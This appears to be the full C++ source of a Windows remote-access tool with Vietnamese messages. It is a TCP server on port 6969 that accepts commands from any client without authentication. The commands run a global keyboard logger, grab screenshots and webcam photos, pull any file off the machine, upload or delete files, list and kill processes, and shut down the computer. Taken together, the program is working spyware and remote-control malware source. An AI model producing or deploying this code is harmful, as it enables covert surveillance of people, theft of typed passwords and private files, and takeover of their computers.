#include <winsock2.h>
#include <windows.h>
#include <fstream>
#include <string>
#include <set>
#include <vector>
#include <map>
#include <atomic>
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <codecvt>
#include <locale>
#include <opencv2/opencv.hpp>
#include <shlobj.h>
#include <iomanip>
#include <filesystem>         
using namespace cv; using namespace std; namespace fs = filesystem;

atomic<bool> keyloggerRunning(false); HANDLE keyloggerHandle = NULL;
HHOOK hook = NULL; ofstream logFile;
SOCKET clientSocket = INVALID_SOCKET; 

map<DWORD, string> specialKeys = {
    {VK_BACK, "[Backspace]"},   {VK_RETURN, "[Enter]"},         {VK_TAB, "[Tab]"},
    {VK_ESCAPE, "[Esc]"},       {VK_LEFT, "[Left]"},            {VK_RIGHT, "[Right]"},
    {VK_UP, "[Up]"},            {VK_DOWN, "[Down]"},            {VK_DELETE, "[Del]"},
    {VK_HOME, "[Home]"},        {VK_END, "[End]"},              {VK_PRIOR, "[PageUp]"},
    {VK_NEXT, "[PageDown]"},    {VK_INSERT, "[Insert]"},        {VK_CAPITAL, "[CapsLock]"},
    {VK_NUMLOCK, "[NumLock]"},  {VK_SCROLL, "[ScrollLock]"},    {VK_SPACE, " "},
    {VK_F1, "[F1]"},            {VK_F2, "[F2]"},                {VK_F3, "[F3]"}, 
    {VK_F4, "[F4]"},            {VK_F5, "[F5]"},                {VK_F6, "[F6]"}, 
    {VK_F7, "[F7]"},            {VK_F8, "[F8]"},                {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},          {VK_F11, "[F11]"},              {VK_F12, "[F12]"}
};

map<DWORD, string> modifierNames = {
    {VK_LCONTROL, "[Ctrl]"},    {VK_RCONTROL, "[Ctrl]"},
    {VK_LSHIFT, "[Shift]"},     {VK_RSHIFT, "[Shift]"},
    {VK_LMENU, "[Alt]"},        {VK_RMENU, "[Alt]"},
    {VK_LWIN, "[Win]"},         {VK_RWIN, "[Win]"}
};
vector<DWORD> modifiers = {VK_LCONTROL, VK_RCONTROL, VK_LSHIFT, VK_RSHIFT, VK_LMENU, VK_RMENU, VK_LWIN, VK_RWIN};

map<DWORD, bool> modState;
map<DWORD, bool> modUsed;

vector<string> getActiveModifiers() {
    vector<string> result;
    if (modState[VK_LCONTROL]   || modState[VK_RCONTROL])   result.push_back("Ctrl");
    if (modState[VK_LMENU]      || modState[VK_RMENU])      result.push_back("Alt");
    if (modState[VK_LSHIFT]     || modState[VK_RSHIFT])     result.push_back("Shift");
    if (modState[VK_LWIN]       || modState[VK_RWIN])       result.push_back("Win");
    return result;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && keyloggerRunning) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        bool isKeyDown = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN);
        bool isKeyUp   = (wParam == WM_KEYUP   || wParam == WM_SYSKEYUP);

        if (modifierNames.count(vk)) {
            if (isKeyDown && !modState[vk]) {
                modState[vk] = true;
                modUsed[vk] = false;
            }
            if (isKeyUp && modState[vk]) {
                if (!modUsed[vk]) {
                    logFile << modifierNames[vk];
                    logFile.flush();
                }
                modState[vk] = false;
            }
            return CallNextHookEx(hook, nCode, wParam, lParam);
        }

        if (isKeyDown) {
            vector<string> combo = getActiveModifiers();
            for (DWORD m : modifiers) if (modState[m]) modUsed[m] = true;

            if (combo.size() == ((modState[VK_LSHIFT] || modState[VK_RSHIFT]) ? 1 : 0) && vk >= 'A' && vk <= 'Z') {
                char ch = (modState[VK_LSHIFT] || modState[VK_RSHIFT]) ? (char)vk : (char)(vk + 32);
                logFile << ch;
            }

            else if (!combo.empty()) {
                string scombo;
                
                for (size_t i = 0; i < combo.size(); ++i) {
                    scombo += combo[i];
                    if (i + 1 < combo.size()) scombo += "+";
                }
                scombo += "+"; string keyPart;

                if (vk >= 'A' && vk <= 'Z') keyPart += (char)vk;
                else if (vk >= '0' && vk <= '9') keyPart += (char)vk;
                else if (specialKeys.count(vk)) keyPart += specialKeys[vk].substr(1, specialKeys[vk].size() - 2); // Loại []!
                else if (
                    (vk >= VK_OEM_1 && vk <= VK_OEM_7) || vk == VK_OEM_PLUS   ||
                     vk == VK_OEM_COMMA                || vk == VK_OEM_PERIOD ||
                     vk == VK_OEM_MINUS                                         ) 
                {
                    BYTE kbState[256] = {0};
                    if (modState[VK_LSHIFT] || modState[VK_RSHIFT]) kbState[VK_SHIFT] = 0x80;
                    GetKeyboardState(kbState);
                    WCHAR uniChar[2] = {0};
                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
                    int ret = ToUnicode(vk, scanCode, kbState, uniChar, 2, 0);
                    if (ret > 0 && uniChar[0] >= 32 && uniChar[0] <= 126) keyPart += (char)uniChar[0];
                    else keyPart += vk;
                } else keyPart += to_string(vk);

                if (!keyPart.empty()) logFile << "[" << scombo << keyPart << "]";
            }

            else {
                if (vk >= 'A' && vk <= 'Z') {
                    char ch = (GetAsyncKeyState(VK_SHIFT) & 0x8000 ? (char)vk : (char)(vk + 32));
                    logFile << ch;
                }
                else if (vk >= '0' && vk <= '9') logFile << (char)vk;
                else if (specialKeys.count(vk)) logFile << specialKeys[vk];
                else if (
                    (vk >= VK_OEM_1 && vk <= VK_OEM_7) || vk == VK_OEM_PLUS     ||
                     vk == VK_OEM_COMMA                || vk == VK_OEM_PERIOD   ||
                     vk == VK_OEM_MINUS                                             )     
                {
                    BYTE kbState[256] = {0};
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) kbState[VK_SHIFT] = 0x80;
                    GetKeyboardState(kbState);
                    WCHAR uniChar[2] = {0};
                    UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);
                    int ret = ToUnicode(vk, scanCode, kbState, uniChar, 2, 0);
                    if (ret > 0 && uniChar[0] >= 32 && uniChar[0] <= 126) logFile << (char)uniChar[0];
                }
            }
            logFile.flush();
        }
    }
    return CallNextHookEx(hook, nCode, wParam, lParam);
}

DWORD WINAPI KeyloggerThread(LPVOID) {
    logFile.open("keys.txt", ios::app);
    if (!logFile.is_open()) return 1;

    for (DWORD m : modifiers) modState[m] = false, modUsed[m] = false;
    keyloggerRunning = true;
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    MSG msg;
    while (keyloggerRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (hook) UnhookWindowsHookEx(hook);
    hook = NULL;
    logFile.close();
    return 0;
}

void takeScreenshot(const string& filename = "screenshot.bmp") {
    HWND hDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hDesktop);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int width = 1920, height = 1080;
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hOld = (HBITMAP)SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    SelectObject(hdcMem, hOld);
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    BITMAPFILEHEADER bmfHeader = {};
    BITMAPINFOHEADER bi = {};
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = bmp.bmWidth;
    bi.biHeight = -bmp.bmHeight;
    bi.biPlanes = 1;
    bi.biBitCount = 32;
    bi.biCompression = BI_RGB;
    DWORD dwBmpSize = ((bmp.bmWidth * bi.biBitCount + 31) / 32) * 4 * bmp.bmHeight;
    char* lpbitmap = new char[dwBmpSize];
    GetDIBits(hdcMem, hBitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    ofstream out(filename, ios::binary);
    bmfHeader.bfType = 0x4D42;
    bmfHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwBmpSize;
    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    out.write((char*)&bmfHeader, sizeof(BITMAPFILEHEADER));
    out.write((char*)&bi, sizeof(BITMAPINFOHEADER));
    out.write(lpbitmap, dwBmpSize);
    out.close();
    delete[] lpbitmap;
    DeleteObject(hBitmap); DeleteDC(hdcMem); ReleaseDC(hDesktop, hdcScreen);
    cerr << "Screenshot saved\n";
}

string wstring_to_utf8(const wstring& str) {
    wstring_convert<codecvt_utf8<wchar_t>> conv;
    return conv.to_bytes(str);
}

void sendProcessList() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        string msg = "Không thể liệt kê process\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
        return;
    }
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);
    ostringstream oss;
    if (!Process32FirstW(snap, &entry)) {
        string msg = "Không tìm thấy process\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
        CloseHandle(snap);
        return;
    }
    int count = -1;
    do {
        wstring line = to_wstring(++count) + L". " + entry.szExeFile + L"\n";
        if (count != 0) oss << wstring_to_utf8(line);
    } while (Process32NextW(snap, &entry));
    CloseHandle(snap);

    string result = oss.str();
    send(clientSocket, result.c_str(), result.size(), 0);
}

struct WindowInfo {
    DWORD pid;
    wstring title;
    wstring exeName;
};

string listAppWindowsText() {
    ostringstream oss;
    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
        if (!IsWindowVisible(hwnd)) return TRUE;
        int len = GetWindowTextLengthW(hwnd);
        if (len == 0) return TRUE; 
        WCHAR title[256];
        GetWindowTextW(hwnd, title, 255);
        if (GetParent(hwnd) != NULL) return TRUE;
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        WCHAR exePath[MAX_PATH] = L"";
        if (hProc) {
            GetModuleFileNameExW(hProc, NULL, exePath, MAX_PATH);
            CloseHandle(hProc);
        }
        wstring exeName = exePath;
        size_t pos = exeName.find_last_of(L"\\/");
        if (pos != wstring::npos) exeName = exeName.substr(pos+1);
        wostringstream woss;
        woss << L"- [" << exeName << L"] - \"" << title << L"\"\n";
        wstring wline = woss.str();
        string utf8line = wstring_to_utf8(wline); 
        (*(ostringstream*)lParam) << utf8line;
        return TRUE;
    }, (LPARAM)&oss);
    return oss.str();
}

wstring utf8_to_wstring(const string& str) {
    wstring_convert<codecvt_utf8_utf16<wchar_t>> conv;
    return conv.from_bytes(str);
}

wstring ansi_to_wstring(const string& ansi) {
    int len = MultiByteToWideChar(CP_ACP, 0, ansi.c_str(), -1, NULL, 0);
    wstring wstr(len, 0);
    MultiByteToWideChar(CP_ACP, 0, ansi.c_str(), -1, &wstr[0], len);
    if (!wstr.empty() && wstr.back() == 0) wstr.pop_back();
    return wstr;
}


void listDirectoryTreeAdvanced(const string& path, const string& filter = "*", 
                              bool showSize = false, int depth = 0, int maxDepth = 3) {
    if (depth > maxDepth) return;
    
    WIN32_FIND_DATAA findData;
    string searchPath = path + "\\" + filter;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            cerr << string(depth * 2, ' ');
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                cerr << "[DIR] " << findData.cFileName << "\n";
                string fullPath = path + "\\" + findData.cFileName;
                listDirectoryTreeAdvanced(fullPath, filter, showSize, depth + 1, maxDepth);
            } else {
                cerr << "[FILE] " << findData.cFileName;
                if (showSize) {
                    LARGE_INTEGER fileSize;
                    fileSize.LowPart = findData.nFileSizeLow;
                    fileSize.HighPart = findData.nFileSizeHigh;
                    cerr << " (" << fileSize.QuadPart << " bytes)";
                }
                cerr << "\n";
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
}

bool hasContent(const wstring& path) {
    WIN32_FIND_DATAW findData;
    wstring searchPath = path + L"\\*";
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) return false;

    bool hasItems = false;
    do {
        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
            hasItems = true;
            break;
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    return hasItems;
}

void listDirectoryTree(wofstream& out, const wstring& path, const wstring& filter = L"*", 
                       bool showSize = false, int depth = 0, int maxDepth = 3) {
    WIN32_FIND_DATAW findData;
    wstring searchPath = path + L"\\" + filter;
    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        out << wstring(depth * 2, L' ') << L"Không truy cập được " << path << L"\n";
        return;
    }
    
    do {
        if (wcscmp(findData.cFileName, L".") != 0 && wcscmp(findData.cFileName, L"..") != 0) {
            out << wstring(depth * 2, L' ');
            
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                out << L"[FOLDER] " << findData.cFileName;
                if (depth >= maxDepth) {
                    wstring fullPath = path + L"\\" + findData.cFileName;
                    if (hasContent(fullPath)) out << L" [...]";
                    out << L"\n";
                } else {
                    out << L"\n";
                    wstring fullPath = path + L"\\" + findData.cFileName;
                    listDirectoryTree(out, fullPath, filter, showSize, depth + 1, maxDepth);
                }
            } else {
                out << L"[FILE] " << findData.cFileName;
                if (showSize) {
                    LARGE_INTEGER fileSize;
                    fileSize.LowPart = findData.nFileSizeLow;
                    fileSize.HighPart = findData.nFileSizeHigh;
                    out << L" (" << fileSize.QuadPart << L" bytes)";
                }
                out << L"\n";
            }
        }
    } while (FindNextFileW(hFind, &findData));
    
    FindClose(hFind);
}

void showDirectoryTree(const wstring& rootPath = L"") {
    wstring targetPath = rootPath.empty() ? L"C:\\" : rootPath;
    DWORD ftyp = GetFileAttributesW(targetPath.c_str());
    wofstream out(L"treefolder.txt");
    out.imbue(locale(locale(), new codecvt_utf8<wchar_t>)); 

    if (ftyp == INVALID_FILE_ATTRIBUTES) {
        out << L"Path \"" << targetPath << L"\" không tồn tại hoặc bị hạn chế\n";
        return;
    }
    if (!(ftyp & FILE_ATTRIBUTE_DIRECTORY)) {
        out << L"Path \"" << targetPath << L"\" sai định dạng\n";
        return;
    }
    out << L"Cây Folder của path: " << targetPath << L"\n";
    out << L"================================================\n";
    listDirectoryTree(out, targetPath);
    out << L"================================================\n";
}

void takeWebcamPhoto(const string& filename = "webcam.bmp") {
    VideoCapture cap(0);
    if (!cap.isOpened()) {
        string msg = "Không thể mở webcam\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
        cerr << msg;
        return;
    }
    Mat frame; for (int i = 0; i < 30; ++i) cap >> frame; 
    if (!frame.empty()) imwrite(filename, frame);
    cap.release();
}

void sendFile(const string& filepath) {
    ifstream file(filepath, ios::binary | ios::ate);
    if (!file) return;
    streamsize size = file.tellg();
    file.seekg(0, ios::beg);

    string filename_only = filepath.substr(filepath.find_last_of("/\\") + 1);

    string header = "FILE:" + filename_only + ":SIZE:" + to_string(size) + "\n";
    send(clientSocket, header.c_str(), header.size(), 0);

    char buffer[4096];
    streamsize remain = size;
    while (remain > 0) {
        file.read(buffer, min((streamsize)sizeof(buffer), remain));
        streamsize bytesRead = file.gcount();
        int sent = send(clientSocket, buffer, bytesRead, 0);
        if (sent <= 0) break;
        remain -= sent;
    }
}

void sendMacAddress() {
    IP_ADAPTER_INFO adapterInfo[16];
    DWORD bufLen = sizeof(adapterInfo);
    DWORD status = GetAdaptersInfo(adapterInfo, &bufLen);
    ostringstream oss;

    if (status != ERROR_SUCCESS) {
        string msg = "Không thể lấy MAC\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
        return;
    }
    PIP_ADAPTER_INFO pAdapter = adapterInfo;
    while (pAdapter) {
        oss << "Adapter: " << pAdapter->Description << "\n";
        oss << "MAC: ";
        for (UINT i = 0; i < pAdapter->AddressLength; i++) {
            oss << hex << setw(2) << setfill('0')
                << (int)pAdapter->Address[i];
            if (i + 1 < pAdapter->AddressLength) oss << ":";
        }
        oss << "\n";
        oss << "IP: " << pAdapter->IpAddressList.IpAddress.String << "\n";
        oss << "------------------------------------------\n";
        pAdapter = pAdapter->Next;
    }
    string macInfo = oss.str();
    send(clientSocket, macInfo.c_str(), macInfo.size(), 0);
}

map<wstring, wstring> startMenuAppPaths;

void getAllShortcuts(const wstring& folder, map<wstring, wstring>& outMap, int depth = 0, int maxDepth = 2) {
    if (depth > maxDepth) return;
    WIN32_FIND_DATAW ffd;
    HANDLE hFind = FindFirstFileW((folder + L"\\*").c_str(), &ffd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;
        wstring fullPath = folder + L"\\" + ffd.cFileName;
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
            getAllShortcuts(fullPath, outMap, depth + 1, maxDepth);
        else {
            wstring fname = ffd.cFileName;
            wstring lower = fname;
            transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
            if (fname.size() > 4 && fname.substr(fname.size() - 4) == L".lnk" &&
                lower.find(L"uninstall") == wstring::npos &&
                lower.find(L"gỡ") == wstring::npos &&
                lower.find(L"remove") == wstring::npos &&
                lower.find(L"uninstaller") == wstring::npos) {
                wstring appName = fname.substr(0, fname.size() - 4);
                outMap[appName] = fullPath;
            }
        }
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);
}

void getStartMenuPrograms(map<wstring, wstring>& outMap) {
    wchar_t commonStartMenu[MAX_PATH], userStartMenu[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, commonStartMenu))) 
        getAllShortcuts(commonStartMenu, outMap, 0, 2);
    
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAMS, NULL, 0, userStartMenu))) 
        getAllShortcuts(userStartMenu, outMap, 0, 2);
}

void sendStartMenuAppList() {
    startMenuAppPaths.clear();
    getStartMenuPrograms(startMenuAppPaths);
    ostringstream oss;
    for (const auto& kv : startMenuAppPaths) 
        oss << wstring_to_utf8(kv.first) << "\n";
    
    string data = oss.str();
    send(clientSocket, data.c_str(), data.size(), 0);
}

void executeCommand(const string& cmd) {
    if (cmd == "shutdown") system("shutdown /s /t 90");
    else if (cmd == "lock") LockWorkStation();
    else if (cmd == "screenshot") {
        takeScreenshot("screenshot.bmp");
        sendFile("screenshot.bmp");
        remove("screenshot.bmp");
    }
    else if (cmd == "webcam") {
        takeWebcamPhoto("webcam.bmp");
        sendFile("webcam.bmp");
        remove("webcam.bmp");
    } 
    else if (cmd == "tree") {
        char currentDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, currentDir);
        wstring wCurrentDir = ansi_to_wstring(currentDir);
        showDirectoryTree(wCurrentDir);
        sendFile("treefolder.txt");
        remove("treefolder.txt");
    }
    else if (cmd.rfind("tree ", 0) == 0) {
        string path = cmd.substr(5);
        showDirectoryTree(utf8_to_wstring(path));
        sendFile("treefolder.txt");
        remove("treefolder.txt");
    }
    else if (cmd == "start_keylogger") {
        if (!keyloggerRunning) {                      
            keyloggerRunning = true;
            keyloggerHandle = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
            string msg = "Đang bắt đầu log\n";
            send(clientSocket, msg.c_str(), msg.size(), 0);
        } else {
            string msg = "Keylogger đã được chạy\n";
            send(clientSocket, msg.c_str(), msg.size(), 0);
        }
    }
    else if (cmd == "get_log") {
        ifstream log("keys.txt");
        string content((istreambuf_iterator<char>(log)), istreambuf_iterator<char>());
        if (content.empty()) content = "Chưa có log nào\n";
        send(clientSocket, content.c_str(), content.size(), 0);
    }
    else if (cmd == "stop_keylogger") {
        if (keyloggerRunning) {
            keyloggerRunning = false;
            PostThreadMessage(GetThreadId(keyloggerHandle), WM_QUIT, 0, 0);
            WaitForSingleObject(keyloggerHandle, INFINITE);
            CloseHandle(keyloggerHandle);
            keyloggerHandle = NULL;
            sendFile("keys.txt");
            remove("keys.txt");
        } else {
            string msg = "Chưa bật keylogger\n";
            send(clientSocket, msg.c_str(), msg.size(), 0);
        }
    } 
    else if (cmd == "macaddress") sendMacAddress();
    else if (cmd == "list_apps") {
        string apps = listAppWindowsText();
        if (apps.empty()) apps = "Không có window nào\n";
        send(clientSocket, apps.c_str(), apps.size(), 0);
    }
    else if (cmd == "list_processes") sendProcessList();
    else if (cmd.rfind("kill_window ", 0) == 0) {
        string quotedTitle = cmd.substr(12);
        if (!quotedTitle.empty() && quotedTitle.front() == '"' && quotedTitle.back() == '"')
            quotedTitle = quotedTitle.substr(1, quotedTitle.length() - 2);
        wstring windowTitle = utf8_to_wstring(quotedTitle);
    
        EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {
            WCHAR title[512];
            GetWindowTextW(hwnd, title, 511);
            wstring* pTitle = (wstring*)lParam;
            if (*pTitle == title) {
                PostMessageW(hwnd, WM_CLOSE, 0, 0);
            }
            return TRUE;
        }, (LPARAM)&windowTitle);
    
        string msg = "Tắt window: " + quotedTitle + "\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
    }       
    else if (cmd.rfind("kill_process ", 0) == 0) {
        string procName = cmd.substr(13);
        wstring wProcName = utf8_to_wstring(procName);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W entry;
        entry.dwSize = sizeof(PROCESSENTRY32W);
        int count = 0;
        if (Process32FirstW(snap, &entry)) {
            do {
                if (_wcsicmp(wProcName.c_str(), entry.szExeFile) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                    if (hProc) {
                        TerminateProcess(hProc, 0);
                        CloseHandle(hProc);
                        count++;
                    }
                }
            } while (Process32NextW(snap, &entry));
        }
        CloseHandle(snap);
        string msg = "Đã tắt " + to_string(count) + " process: " + procName + "\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
    }
    else if (cmd == "list_startapps") sendStartMenuAppList();
    else if (cmd.rfind("startapp ", 0) == 0) {
        string app = cmd.substr(9);
        wstring wApp = utf8_to_wstring(app);
        auto it = startMenuAppPaths.find(wApp);
        if (it != startMenuAppPaths.end()) {
            HINSTANCE hinst = ShellExecuteW(NULL, L"open", it->second.c_str(), NULL, NULL, SW_SHOWNORMAL);
            if ((INT_PTR)hinst <= 32) {
                string msg = "ShellExecuteW lỗi, code: " + to_string((INT_PTR)hinst) +
                    ", path: " + wstring_to_utf8(it->second) + "\n";
                send(clientSocket, msg.c_str(), msg.size(), 0);
            } else {
                string msg = "Đã gửi lệnh mở: " + app + "\n";
                send(clientSocket, msg.c_str(), msg.size(), 0);
            }
        } else {
            string msg = "Không tìm thấy app: " + app + "\n";
            send(clientSocket, msg.c_str(), msg.size(), 0);
        }
    }
    else if (cmd.rfind("get_file ", 0) == 0) {
        string path = cmd.substr(9);
        sendFile(path);
    }
    else if (cmd.rfind("upload_file ", 0) == 0) {
        string meta = cmd.substr(12);        
        auto colon = meta.find(':');
        string fnameUtf8 = meta.substr(0, colon);
        size_t size = stoul(meta.substr(colon + 1));
        vector<char> data(size);
        size_t received = 0;
        while (received < size) {
            int n = recv(clientSocket, data.data() + received, size - received, 0);
            if (n <= 0) break;
            received += n;
        }
        fs::create_directories("received");
        fs::path outPath = fs::u8path("received") / fs::u8path(fnameUtf8);
        ofstream out(outPath, ios::binary);
        out.write(data.data(), size);
        string msg = u8"Đã nhận file " + fnameUtf8 + "\n";
        send(clientSocket, msg.c_str(), msg.size(), 0);
    }      
    else if (cmd == "help") {
        ostringstream oss;
        oss << "                  Các lệnh có sẵn:                         \n"
            << "============================================================\n"
            << left
            << setw(22) << "shutdown"           << "- Tắt máy server sau 1p30s\n"
            << setw(22) << "lock"               << "- Khóa màn hình\n"
            << setw(22) << "screenshot"         << "- Chụp ảnh màn hình và gửi file\n"
            << setw(22) << "webcam"             << "- Chụp ảnh webcam và gửi file\n"
            << setw(22) << "tree"               << "- Hiển thị cây thư mục của thư mục hiện tại\n"
            << setw(22) << "tree <path>"        << "- Hiển thị cây thư mục của đường dẫn chỉ định\n"
            << setw(22) << "start_keylogger"    << "- Bắt đầu log bàn phím\n"
            << setw(22) << "stop_keylogger"     << "- Dừng keylogger và gửi file log\n"
            << setw(22) << "macaddress"         << "- Gửi địa chỉ MAC và thông tin IP\n"
            << setw(22) << "list_apps"          << "- Liệt kê tất cả các cửa sổ ứng dụng\n"
            << setw(22) << "list_processes"     << "- Liệt kê tất cả các tiến trình đang chạy\n"
            << setw(22) << "list_startapps"     << "- Liệt kê tất cả các ứng dụng trong Start Menu\n"
            << setw(22) << "kill_window <title>"<< "- Tắt cửa sổ ứng dụng theo tiêu đề\n"
            << setw(22) << "kill_process <name>"<< "- Tắt tiến trình theo tên\n"
            << setw(22) << "startapp <name>"    << "- Mở ứng dụng từ Start Menu theo tên\n"
            << setw(22) << "delete <path>"      << "- Xóa file tại đường dẫn chỉ định\n"
            << "============================================================\n";
        string helpText = oss.str();
        send(clientSocket, helpText.c_str(), helpText.size(), 0);
    }
    else if (cmd.rfind("delete ", 0) == 0 ) {
        string path = cmd.substr(7);
        wstring wPath = utf8_to_wstring(path);
        if (fs::remove(wPath.c_str())) {
            string msg = "Đã xóa file: " + path + "\n";
            send(clientSocket, msg.c_str(), msg.size(), 0);
        } else {
            string msg = "Không thể xóa file: " + path + "\n";
            send(clientSocket, msg.c_str(), msg.size(), 0);
        }
    }
    else {
        ostringstream oss;
        oss << "Lệnh không hợp lệ: " << cmd << "\nSử dụng 'help' để xem các lệnh có sẵn\n";
        string msg = oss.str();
        send(clientSocket, msg.c_str(), msg.size(), 0);
    }
}

#define DEFAULT_PORT 6969

void runServer() {
    WSADATA wsaData;
    SOCKET listening = INVALID_SOCKET;
    struct sockaddr_in server, client;
    int c, recv_size;
    char client_message[1024] = {0};
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) return;
    if((listening = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {WSACleanup(); return;}
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(DEFAULT_PORT);
    if(::bind(listening, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {closesocket(listening); WSACleanup(); return;}
    listen(listening, 3);
    cerr << "Server started, waiting for client on port " << DEFAULT_PORT << "...\n";
    c = sizeof(struct sockaddr_in);
    while(true) {
        clientSocket = accept(listening, (struct sockaddr *)&client, &c); 
        if (clientSocket == INVALID_SOCKET) break;
        cerr << "Client connected: " << inet_ntoa(client.sin_addr) << "\n";
        while ((recv_size = recv(clientSocket, client_message, 1023, 0)) > 0) {
            client_message[recv_size] = '\0';
            string cmd(client_message);
            if (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r')) cmd.pop_back();
            cerr << "Received command: " << cmd << endl;
            executeCommand(cmd); 
            memset(client_message, 0, sizeof(client_message));
        }
        closesocket(clientSocket);
        cerr << "Client disconnected\n";
    }
    closesocket(listening);
    WSACleanup();
}

int main() {
    cerr << "Socket Command Service started...\n";
    runServer();
    if (keyloggerRunning) {
        keyloggerRunning = false;
        PostThreadMessage(GetThreadId(keyloggerHandle), WM_QUIT, 0, 0);
        WaitForSingleObject(keyloggerHandle, INFINITE);
        CloseHandle(keyloggerHandle);
    }
    return 0;
}


